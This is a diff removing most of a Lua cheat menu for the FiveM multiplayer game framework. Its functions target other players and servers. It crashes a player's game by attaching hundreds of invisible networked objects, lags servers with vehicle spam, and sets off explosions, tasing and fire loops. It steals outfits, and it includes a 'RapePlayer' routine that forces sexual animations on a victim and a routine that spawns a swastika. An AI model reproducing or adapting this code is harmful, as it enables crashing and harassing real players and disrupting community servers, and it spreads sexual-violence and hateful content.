-    local all_weapons = {"WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_MINISMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_POOLCUE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"}
-    FM.Notifications = {}
-
-    local function _clamp(val, min, max)
-        if val < min then return min end
-        if val > max then return max end
-
-        return val
-    end
-
-    function FM:EquipOutfit(data)
-        local ped = FM:GetFunction("PlayerPedId")()
-        FM:GetFunction("SetPlayerModel")(FM:GetFunction("PlayerId")(), data.model)
-        FM:GetFunction("SetPedPropIndex")(ped, 0, data.hat, data.hat_texture, 1)
-        FM:GetFunction("SetPedPropIndex")(ped, 1, data.glasses, data.glasses_texture, 1)
-        FM:GetFunction("SetPedPropIndex")(ped, 2, data.ear, data.ear_texture, 1)
-        FM:GetFunction("SetPedPropIndex")(ped, 6, data.watch, data.watch_texture, 1)
-        FM:GetFunction("SetPedPropIndex")(ped, 7, data.wrist, data.wrist_texture, 1)
-        FM:GetFunction("SetPedComponentVariation")(ped, 0, data.head.draw, data.head.texture, data.head.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 1, data.beard.draw, data.beard.texture, data.beard.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 2, data.hair.draw, data.hair.texture, data.hair.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 3, data.torso.draw, data.torso.texture, data.torso.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 4, data.legs.draw, data.legs.texture, data.legs.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 5, data.hands.draw, data.hands.texture, data.hands.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 6, data.feet.draw, data.feet.texture, data.feet.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 7, data.accessory_1.draw, data.accessory_1.texture, data.accessory_1.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 8, data.accessory_2.draw, data.accessory_2.texture, data.accessory_2.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 9, data.accessory_3.draw, data.accessory_3.texture, data.accessory_3.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 10, data.mask.draw, data.mask.texture, data.mask.palette)
-        FM:GetFunction("SetPedComponentVariation")(ped, 11, data.auxillary.draw, data.auxillary.texture, data.auxillary.palette)
-    end
-
-    function FM:StealOutfit(player)
-        local ped = FM:GetFunction("GetPlayerPed")(player)
-
-        FM:EquipOutfit({
-            model = FM:GetFunction("GetEntityModel")(ped),
-            hat = FM:GetFunction("GetPedPropIndex")(ped, 0),
-            hat_texture = FM:GetFunction("GetPedPropTextureIndex")(ped, 0),
-            glasses = FM:GetFunction("GetPedPropIndex")(ped, 1),
-            glasses_texture = FM:GetFunction("GetPedPropTextureIndex")(ped, 1),
-            ear = FM:GetFunction("GetPedPropIndex")(ped, 2),
-            ear_texture = FM:GetFunction("GetPedPropTextureIndex")(ped, 2),
-            watch = FM:GetFunction("GetPedPropIndex")(ped, 6),
-            watch_texture = FM:GetFunction("GetPedPropTextureIndex")(ped, 6),
-            wrist = FM:GetFunction("GetPedPropIndex")(ped, 7),
-            wrist_texture = FM:GetFunction("GetPedPropTextureIndex")(ped, 3),
-            head = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 0),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 0),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 0)
-            },
-            beard = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 1),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 1),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 1)
-            },
-            hair = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 2),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 2),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 2)
-            },
-            torso = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 3),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 3),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 3)
-            },
-            legs = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 4),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 4),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 4)
-            },
-            hands = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 5),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 5),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 5)
-            },
-            feet = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 6),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 6),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 6)
-            },
-            accessory_1 = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 7),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 7),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 7)
-            },
-            accessory_2 = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 8),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 8),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 8)
-            },
-            accessory_3 = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 9),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 9),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 9)
-            },
-            mask = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 10),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 10),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 10)
-            },
-            auxillary = {
-                draw = FM:GetFunction("GetPedDrawableVariation")(ped, 11),
-                texture = FM:GetFunction("GetPedTextureVariation")(ped, 11),
-                palette = FM:GetFunction("GetPedPaletteVariation")(ped, 11)
-            }
-        })
-    end
-
-    function FM:RequestModelSync(model, timeout)
-        timeout = timeout or 2500
-        local counter = 0
-        FM:GetFunction("RequestModel")(model)
-
-        while not FM:GetFunction("HasModelLoaded")(model) do
-            FM:GetFunction("RequestModel")(model)
-            counter = counter + 100
-            Wait(100)
-            if counter >= timeout then return false end
-        end
-
-        return true
-    end
-
-    function FM.Util:ValidPlayer(src)
-        if not src then return false end
-
-        return FM:GetFunction("GetPlayerServerId")(src) ~= nil and FM:GetFunction("GetPlayerServerId")(src) > 0
-    end
-
-    function FM:SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)
-        CreateThread(function()
-            local speed = 0
-            local rpm = 0
-
-            if FM:GetFunction("IsModelValid")(modelName) and FM:GetFunction("IsModelAVehicle")(modelName) then
-                FM:GetFunction("RequestModel")(modelName)
-
-                while not FM:GetFunction("HasModelLoaded")(modelName) do
-                    Wait(0)
-                end
-
-                local pos = (spawnInside and FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0) or FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 4.0, 0.0))
-                local heading = FM:GetFunction("GetEntityHeading")(FM:GetFunction("PlayerPedId")()) + (spawnInside and 0 or 90)
-                local vehicle = FM:GetFunction("CreateVehicle")(FM:GetFunction("GetHashKey")(modelName), pos.x, pos.y, pos.z, heading, true, false)
-                FM:GetFunction("SetPedIntoVehicle")(FM:GetFunction("PlayerPedId")(), vehicle, -1)
-                FM:GetFunction("SetVehicleEngineOn")(vehicle, true, true)
-                FM:GetFunction("SetVehicleForwardSpeed")(vehicle, speed)
-                FM:GetFunction("SetVehicleCurrentRpm")(vehicle, rpm)
-            end
-        end)
-    end
-
-    local _text_input
-
-    function FM:DrawTextInput()
-        if not _text_input or _text_input == "" then return end
-        FM.Painter:DrawText(_text_input, 4, false, self:ScrW() / 3.25, self:ScrH() / 2.7, 0.4, FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], 255)
-    end
-
-    function FM:GetTextInput(TextEntry, ExampleText, MaxStringLength)
-        _text_input = TextEntry .. " (DO NOT PRESS ESCAPE / RMB)"
-        FM:GetFunction("DisplayOnscreenKeyboard")(1, "", "", ExampleText, "", "", "", MaxStringLength)
-        blockinput = true
-
-        while FM:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and FM:GetFunction("UpdateOnscreenKeyboard")() ~= 2 do
-            if FM.Showing then
-                FM:DrawMenu()
-            end
-
-            self:DrawTextInput()
-            Wait(0)
-        end
-
-        if FM:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then
-            if FM.Showing then
-                FM:DrawMenu()
-            end
-
-            _text_input = nil
-            local result = FM:GetFunction("GetOnscreenKeyboardResult")()
+        if UpdateOnscreenKeyboard() ~= 2 then
+            local result = GetOnscreenKeyboardResult()
+            Citizen.Wait(500)
             blockinput = false
-            FM:GetFunction("CancelOnscreenKeyboard")()
-
             return result
         else
-            if FM.Showing then
-                FM:DrawMenu()
-            end
-
-            _text_input = nil
+            Citizen.Wait(500)
             blockinput = false
-            FM:GetFunction("CancelOnscreenKeyboard")()
-
             return nil
         end
     end
 
-    function FM.Util:DeleteEntity(entity)
-        if not FM:GetFunction("DoesEntityExist")(entity) then return end
-        FM:GetFunction("NetworkRequestControlOfEntity")(entity)
-        FM:GetFunction("SetEntityAsMissionEntity")(entity, true, true)
-        FM:GetFunction("DeletePed")(entity)
-        FM:GetFunction("DeleteEntity")(entity)
-        FM:GetFunction("DeleteObject")(entity)
-        FM:GetFunction("DeleteVehicle")(entity)
-    end
+    FiveM.GetVehicleProperties = function(vehicle)
+        local color1, color2 = GetVehicleColours(vehicle)
+        local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
+        local extras = {}
 
-    local sounds = {
-        ["INFO"] = {
-            times = 3,
-            name = "DELETE",
-            dict = "HUD_DEATHMATCH_SOUNDSET"
-        },
-        ["WARN"] = {
-            times = 1,
-            name = "Turn",
-            dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS"
-        },
-        ["ERROR"] = {
-            times = 3,
-            name = "Hack_Failed",
-            dict = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"
-        }
-    }
-
-    local last_sound = 0
-
-    function FM:AddNotification(type, msg, timeout)
-        timeout = timeout or 10000
-
-        if FM.Config.UseSounds and last_sound <= FM:GetFunction("GetGameTimer")() then
-            local sound = sounds[type] or {}
-
-            for i = 1, sound.times or 1 do
-                if sound.name and sound.dict then
-                    FM:GetFunction("PlaySoundFrontend")(-1, sound.name, sound.dict, false)
-                end
-            end
-
-            last_sound = FM:GetFunction("GetGameTimer")() + 200
-        end
-
-        for _, v in dict.ipairs(self.Notifications) do
-            if (v.RawMsg or v.Message) == msg and not self.Notifications[_ + 1] then
-                v.Count = (v.Count or 1) + 1
-                v.RawMsg = v.RawMsg or v.Message
-                v.Message = v.RawMsg .. " ~w~(x" .. v.Count .. ")"
-                v.Duration = (timeout / 1000)
-                v.Expires = FM:GetFunction("GetGameTimer")() + timeout
-
-                return
-            end
-        end
-
-        local notification = {}
-        notification.Type = type
-        notification.Message = msg
-        notification.Duration = timeout / 1000
-        notification.Expires = FM:GetFunction("GetGameTimer")() + timeout
-
-        self.Notifications[#self.Notifications + 1] = notification
-        FM:Print("[Notification] [" .. type .. "]" .. ": " .. msg)
-    end
-
-    function FM:DoNetwork(obj)
-        if not FM:GetFunction("DoesEntityExist")(obj) then return end
-        local id = FM:GetFunction("ObjToNet")(obj)
-        FM:GetFunction("NetworkSetNetworkIdDynamic")(id, true)
-        FM:GetFunction("SetNetworkIdExistsOnAllMachines")(id, true)
-        FM:GetFunction("SetNetworkIdCanMigrate")(id, false)
-
-        for _, src in dict.pairs(FM.PlayerCache) do
-            FM:GetFunction("SetNetworkIdSyncToPlayer")(id, src, true)
-        end
-    end
-
-    function FM:GasPlayer(player)
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            local ped = FM:GetFunction("GetPlayerPed")(player)
-            if not FM:GetFunction("DoesEntityExist")(ped) then return end
-            FM:GetFunction("ClearPedTasksImmediately")(ped)
-            local dest = FM:GetFunction("GetPedBoneCoords")(ped, FM:GetFunction("GetPedBoneIndex")(ped, 0), 0.0, 0.0, 0.0, 0.0)
-            local origin = FM:GetFunction("GetPedBoneCoords")(ped, FM:GetFunction("GetPedBoneIndex")(ped, 57005), 0.0, 0.0, 0.0, 0.0)
-
-            for i = 1, 5 do
-                FM:GetFunction("AddExplosion")(origin.x + dict.math.random(-1, 1), origin.y + dict.math.random(-1, 1), origin.z - 1.0, 12, 100.0, true, false, 0.0)
-                Wait(10)
-            end
-
-            local pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-            local fence_u = FM:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
-            FM:DoNetwork(fence_u)
-            FM:GetFunction("SetEntityRotation")(fence_u, 0.0, 0.0, 0.0)
-            FM:GetFunction("FreezeEntityPosition")(fence_u, true)
-            Wait(10)
-            local fence_r = FM:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
-            FM:DoNetwork(fence_r)
-            FM:GetFunction("SetEntityRotation")(fence_r, 0.0, 0.0, 90.0)
-            FM:GetFunction("FreezeEntityPosition")(fence_r, true)
-            Wait(10)
-            local fence_b = FM:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y + 1.85, pos.z - 1.0, true, true, true)
-            FM:DoNetwork(fence_b)
-            FM:GetFunction("SetEntityRotation")(fence_b, 0.0, 0.0, 0.0)
-            FM:GetFunction("FreezeEntityPosition")(fence_b, true)
-            local fence_l = FM:GetFunction("CreateObject")(-759902142, pos.x + 1.35, pos.y - 1.0, pos.z - 1.0, true, true, true)
-            FM:DoNetwork(fence_l)
-            FM:GetFunction("SetEntityRotation")(fence_l, 0.0, 0.0, 90.0)
-            FM:GetFunction("FreezeEntityPosition")(fence_l, true)
-            FM.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](ped, 10.0)
-        end)
-    end
-
-    function FM:TazePlayer(player)
-        local ped = FM:GetFunction("GetPlayerPed")(player)
-        local destination = FM:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
-        local origin = FM:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
-        FM:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, FM:GetFunction("GetHashKey")("WEAPON_STUNGUN"), FM:GetFunction("PlayerPedId")(), true, false, 24000.0)
-    end
-
-    function FM:HydrantPlayer(player)
-        local ped = FM:GetFunction("GetPlayerPed")(player)
-        local origin = FM:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
-        FM:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 13, 100.0, (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
-    end
-
-    function FM:FirePlayer(player)
-        local ped = FM:GetFunction("GetPlayerPed")(player)
-        local origin = FM:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
-        FM:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 12, 100.0, (FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
-    end
-
-    local crash_model_list = {}
-    local crash_models = {"hei_prop_carrier_cargo_02a", "p_cablecar_s", "p_ferris_car_01", "prop_cj_big_boat", "prop_rock_4_big2", "prop_steps_big_01", "v_ilev_lest_bigscreen", "prop_carcreeper", "apa_mp_h_bed_double_09", "apa_mp_h_bed_wide_05", "sanchez", "cargobob", "prop_cattlecrush", "prop_cs_documents_01"} --{"prop_ferris_car_01_lod1", "prop_construcionlamp_01", "prop_fncconstruc_01d", "prop_fncconstruc_02a", "p_dock_crane_cabl_s", "prop_dock_crane_01", "prop_dock_crane_02_cab", "prop_dock_float_1", "prop_dock_crane_lift", "apa_mp_h_bed_wide_05", "apa_mp_h_bed_double_08", "apa_mp_h_bed_double_09", "csx_seabed_bldr4_", "imp_prop_impexp_sofabed_01a", "apa_mp_h_yacht_bed_01"}
-
-    CreateThread(function()
-        FM:RequestModelSync(spike_model)
-
-        local loaded = 0
-
-        for i = 1, #crash_models do
-            if FM:RequestModelSync(crash_models[i]) then
-                loaded = loaded + 1
-            end
-        end
-
-        for i = 1, #crash_models * 5 do
-            for _ = 1, 2 do
-                table.insert(crash_models, crash_models[dict.math.random(1, #crash_models)])
-                loaded = loaded + 1
-            end
-        end
-
-        FM:Print("[MISC] Loaded " .. loaded .. " model(s).")
-    end)
-
-    local crash_loop
-    local notified_crash = {}
-
-    function FM:CrashPlayer(player, all, strict)
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-        local ATT_LIMIT = 400
-        local CUR_ATT_COUNT = 0
-
-        CreateThread(function()
-            local ped = FM:GetFunction("GetPlayerPed")(player)
-            local playerPos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-            local selfPos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-            local dist = FM:GetFunction("GetDistanceBetweenCoords")(playerPos.x, playerPos.y, playerPos.z, selfPos.x, selfPos.y, selfPos.z, true)
-
-            if dist <= 500.0 then
-                local safeX, safeY, safeZ = playerPos.x - dict.math.random(-1000, 1000), playerPos.y - dict.math.random(-1000, 1000), -200
-                FM:GetFunction("SetEntityCoords")(FM:GetFunction("PlayerPedId")(), _clamp(safeX, -2000, 2000) + 0.0, _clamp(safeY, -2000, 2000) + 0.0, safeZ)
-            end
-
-            FM:AddNotification("INFO", "Crashing " .. FM:CleanName(FM:GetFunction("GetPlayerName")(player)), 10000)
-            local bad_obj
-
-            for i = 1, ATT_LIMIT do
-                if CUR_ATT_COUNT >= ATT_LIMIT or not FM:GetFunction("DoesEntityExist")(ped) then break end
-                local method = dict.math.random(1, 2)
-
-                if strict == "object" then
-                    method = 1
-                elseif strict == "ped" then
-                    method = 2
-                end
-
-                if method == 1 then
-                    local model = crash_models[dict.math.random(1, #crash_models)]
-                    local obj = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, true, true, true)
-
-                    if not FM:GetFunction("DoesEntityExist")(obj) then
-                        bad_obj = true
-
-                        if not notified_crash[model] then
-                            FM:Print("[CRASH] Failed to load object ^3" .. model .. "^7")
-                            notified_crash[model] = true
-                        end
-                    else
-                        FM:DoNetwork(obj)
-                        FM:GetFunction("AttachEntityToEntity")(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
-                        FM:GetFunction("SetEntityVisible")(obj, false)
-                        crash_model_list[obj] = true
-                        CUR_ATT_COUNT = CUR_ATT_COUNT + 1
-                    end
-                elseif method == 2 then
-                    local model = FM.FreeCam.SpawnerOptions.PED[dict.math.random(1, #FM.FreeCam.SpawnerOptions.PED)]
-                    local ent = FM:GetFunction("CreatePed")(24, FM:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, 0.0, true, true)
-
-                    if FM:GetFunction("DoesEntityExist")(ent) then
-                        FM:DoNetwork(ent)
-                        FM:GetFunction("AttachEntityToEntity")(ent, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, 1, false)
-                        FM:GetFunction("SetEntityVisible")(ent, false)
-                        crash_model_list[ent] = true
-                        CUR_ATT_COUNT = CUR_ATT_COUNT + 1
-                    end
-                end
-
-                Wait(0)
-            end
-
-            if bad_obj then
-                self:AddNotification("ERROR", "Some crash models failed to load. See console for details.", 10000)
-            end
-
-            notified_crash = {}
-            FM:CleanupCrash(player, all)
-        end)
-    end
-
-    function FM:CleanupCrash(player, all)
-        CreateThread(function()
-            if crash_loop ~= nil and not all then return end
-            crash_loop = not all and player or nil
-
-            if crash_loop and not FM:GetFunction("DoesEntityExist")(crash_loop) then
-                crash_loop = nil
-            end
-
-            local timeout = 0
-
-            while (all and timeout <= 180000) or (FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(crash_loop)) and timeout <= 120000) do
-                timeout = timeout + 100
-                Wait(100)
-            end
-
-            while true do
-                if not FM.Enabled then return end
-
-                for cobj, _ in dict.pairs(crash_model_list) do
-                    if FM:RequestControlSync(cobj) then
-                        FM:GetFunction("DeleteObject")(cobj)
-                        FM:GetFunction("DeleteEntity")(cobj)
-                        crash_model_list[cobj] = nil
-                    end
-                end
-
-                if #crash_model_list == 0 then
-                    FM:AddNotification("INFO", "Cleaned up crash objects.")
-                    crash_loop = nil
-
-                    return
-                else
-                    FM:AddNotification("ERROR", "Failed to cleanup " .. #crash_model_list .. " crash object" .. (#crash_model_list ~= 1 and "s" or "") .. ". Retrying in 5 seconds.")
-                    Wait(5000)
-                end
-            end
-        end)
-    end
-
-    function FM:RapePlayer(player)
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            local model = FM.FreeCam.SpawnerOptions.PED[dict.math.random(1, #FM.FreeCam.SpawnerOptions.PED)]
-            FM:RequestModelSync(model)
-            FM:GetFunction("RequestAnimDict")("rcmpaparazzo_2")
-
-            while not FM:GetFunction("HasAnimDictLoaded")("rcmpaparazzo_2") do
-                Wait(0)
-            end
-
-            if FM:GetFunction("IsPedInAnyVehicle")(FM:GetFunction("GetPlayerPed")(player), true) then
-                local veh = FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("GetPlayerPed")(player), true)
-                FM:GetFunction("ClearPedTasksImmediately")(FM:GetFunction("GetPlayerPed")(player))
-                while not FM:GetFunction("NetworkHasControlOfEntity")(veh) do
-                    FM:GetFunction("NetworkRequestControlOfEntity")(veh)
-                    Wait(0)
-                end
-
-                FM:GetFunction("SetEntityAsMissionEntity")(veh, true, true)
-                FM:GetFunction("DeleteVehicle")(veh)
-                FM:GetFunction("DeleteEntity")(veh)
-            end
-
-            local count = -0.2
-
-            for _ = 1, 3 do
-                local c = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetPlayerPed")(player), 0.0, 0.0, 0.0)
-                local x, y, z = c.x, c.y, c.z
-                local rape_ped = FM:GetFunction("CreatePed")(4, FM:GetFunction("GetHashKey")(model), x, y, z, 0.0, true, false)
-                FM:GetFunction("SetEntityAsMissionEntity")(rape_ped, true, true)
-                FM:GetFunction("AttachEntityToEntity")(rape_ped, FM:GetFunction("GetPlayerPed")(player), 4103, 11816, count, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
-                FM:GetFunction("ClearPedTasks")(FM:GetFunction("GetPlayerPed")(player))
-                FM:GetFunction("TaskPlayAnim")(FM:GetFunction("GetPlayerPed")(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
-                FM:GetFunction("SetPedKeepTask")(rape_ped)
-                FM:GetFunction("SetPedAlertness")(rape_ped, 0.0)
-                FM:GetFunction("TaskPlayAnim")(rape_ped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
-                FM:GetFunction("SetEntityInvincible")(rape_ped, true)
-                count = count - 0.4
-            end
-        end)
-    end
-
-    local car_spam = {"adder", "dinghy", "biff", "rhapsody", "ruiner", "picador", "sabregt", "baller4", "emperor", "ingot", "primo2", "velum2", "vestra", "baller", "fq2", "dubsta", "patriot", "rocoto", "primo", "stratum", "surge", "tailgater", "washington", "airbus", "tourbus", "taxi", "rentalbus", "banshee", "blista2", "bestiagts", "blistveh", "comet2", "buffalo", "coquette", "ninef", "dodo", "trash2", "radi", "jester", "jet", "tug", "bus", "dump"}
-
-    function FM:CarSpamServer()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            for _, hash in dict.ipairs(car_spam) do
-                self:RequestModelSync(hash)
-
-                for _, src in dict.pairs(FM.PlayerCache) do
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                        local ped = FM:GetFunction("GetPlayerPed")(src)
-                        local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-                        FM:GetFunction("CreateVehicle")(FM:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, FM:GetFunction("GetEntityHeading")(ped), true, false)
-                    end
-
-                    Wait(5)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
-
-    local _use_lag_server
-    local _use_hydrant_loop
-    local _use_fire_loop
-    local _use_taze_loop
-    local _use_delete_loop
-    local _use_explode_vehicle_loop
-    local _use_explode_player_loop
-    local _use_launch_loop
-
-    function FM:LaggingServer()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_lag_server do
-                for _, hash in dict.ipairs(car_spam) do
-                    self:RequestModelSync(hash)
-
-                    for _, src in dict.pairs(FM.PlayerCache) do
-                        src = dict.tonumber(src)
-
-                        if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                            local ped = FM:GetFunction("GetPlayerPed")(src)
-                            local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-                            FM:GetFunction("CreateVehicle")(FM:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, FM:GetFunction("GetEntityHeading")(ped), true, false)
-                        end
-
-                        Wait(5)
-                    end
-
-                    Wait(5)
-                end
-
-                Wait(20)
-            end
-        end)
-    end
-
-    function FM:HydrantLoop()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_hydrant_loop do
-                for _, src in dict.pairs(FM.PlayerCache) do
-                    if not _use_hydrant_loop then break end
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                        FM:HydrantPlayer(src)
-                    end
-
-                    Wait(1)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
-
-    function FM:FireLoop()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_fire_loop do
-                for _, src in dict.pairs(FM.PlayerCache) do
-                    if not _use_fire_loop then break end
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                        FM:FirePlayer(src)
-                    end
-
-                    Wait(1)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
-
-    function FM:TazeLoop()
-        if FM.Config.SafeMode then return FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
-
-        CreateThread(function()
-            while _use_taze_loop do
-                for _, src in dict.pairs(FM.PlayerCache) do
-                    if not _use_taze_loop then break end
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                        FM:TazePlayer(src)
-                    end
-
-                    Wait(1)
-                end
-
-                Wait(5)
-            end
-        end)
-    end
